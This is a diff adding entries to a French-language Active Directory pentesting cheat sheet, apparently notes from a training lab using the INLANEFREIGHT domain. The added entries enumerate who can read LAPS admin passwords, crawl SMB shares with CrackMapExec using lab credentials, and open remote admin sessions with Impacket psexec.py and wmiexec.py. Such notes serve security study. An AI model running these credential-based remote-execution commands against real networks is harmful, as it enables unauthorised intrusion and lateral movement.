@@ -582,6 +582,19 @@ OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
 OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
 ```
 
+Cette commande PowerShell est utilisée pour rechercher les entités (principals) qui ont des droits étendus pour lire les attributs de mot de passe de la solution LAPS (Local Administrator Password Solution) dans Active Directory. Utile pour auditer les permissions et s’assurer que seuls les utilisateurs autorisés peuvent accéder aux mots de passe administratifs gérés par LAPS.
+```
+Find-AdmPwdExtendedRights
+
+ComputerName                Identity                    Reason
+------------                --------                    ------
+EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\Domain Admins Delegated
+EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\LAPS Admins   Delegated
+SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\Domain Admins Delegated
+SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\LAPS Admins   Delegated
+WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\Domain Admins Delegated
+WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\LAPS Admins   Delegated
+```
 
 Cette commande PowerShell affiche tous les ordinateurs avec LAPS (Local Administrator Password Solution) activé, y compris les informations sur l’expiration des mots de passe et les mots de passe eux-mêmes si l’utilisateur a les droits d’accès nécessaires. Utile pour auditer les environnements Active Directory qui ont déployé LAPS, ce qui peut aider à comprendre quelles machines sont protégées et comment les mots de passe administratifs sont gérés.
 ```
@@ -612,6 +625,21 @@ enumdomgroups
 querygroup 0xff0
 ```
 
+Cette commande utilise CrackMapExec pour se connecter à un serveur SMB à l’adresse IP 172.16.5.5 avec les identifiants utilisateur forend et mot de passe Klmcargo2. Elle utilise le module spider_plus pour explorer le partage réseau spécifié (Department Shares). Utile pour découvrir et cartographier les partages réseau disponibles sur un système cible, en recherchant des fichiers et des informations sensibles.
+```
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+
+```
+
+Cette commande utilise l’outil psexec.py d’Impacket pour se connecter à un hôte Windows à l’adresse IP 172.16.5.125 via le partage administratif ADMIN$ en utilisant les identifiants utilisateur wley et mot de passe transporter@4 dans le domaine inlanefreight.local. Utile pour obtenir un accès à distance avec des privilèges administratifs sur la machine cible.
+```
+psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
+```
+
+Cette commande utilise l’outil wmiexec.py d’Impacket pour se connecter à un hôte Windows à l’adresse IP 172.16.5.5 via WMI (Windows Management Instrumentation) en utilisant les identifiants utilisateur wley et mot de passe transporter@4 dans le domaine inlanefreight.local. Utile pour exécuter des commandes à distance sur la machine cible avec des privilèges administratifs.
+```
+wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
+```
 ```
 
 Get-Module
